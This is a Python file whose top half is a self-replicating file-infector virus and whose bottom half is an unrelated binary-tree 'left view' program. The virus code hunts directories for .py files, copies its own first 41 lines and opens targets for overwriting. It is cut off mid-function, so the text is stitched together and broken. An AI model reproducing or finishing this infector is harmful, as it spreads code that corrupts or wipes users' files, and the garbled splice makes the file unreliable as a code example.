#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python Program to print left view
 
# Tree Node Class
class Node:
    def __init__(self, data):
        self.data = data
        self.left = None
        self.right = None
 
# function to get the left view of binary tree
def leftView(root):
    ans = []
 
    if not root:
        return ans
 
    q = []
    q.append(root)
    q.append(None)
    ok = True
 
    while len(q) != 0:
        it = q[0]
        del q[0]
        if it == None:
            if ok == False:
                ok = True
            if len(q) == 0:
                break
 
            else:
                q.append(None)
 
        else:
            if ok:
                ans.append(it.data)
                ok = False
 
            if it.left != None:
                q.append(it.left)
            if it.right != None:
                q.append(it.right)
 
    return ans
 
 
# Driver Code
if __name__ == '__main__':
    root = Node(10)
    root.left = Node(2)
    root.right = Node(3)
    root.left.left = Node(7)
    root.left.right = Node(8)
    root.right.right = Node(15)
    root.right.left = Node(12)
    root.right.right.left = Node(14)
 
    vec = leftView(root)
 
    # print the left view
    for x in vec:
        print(x, end=" ")
    print()
 
# This code is contributed by Tapesh(tapeshdua420)
'''
Time Complexity: O(n) - where n is the number of nodes in the binary tree
Space Complexity: O(n) - since using space for auxiliary queue
'''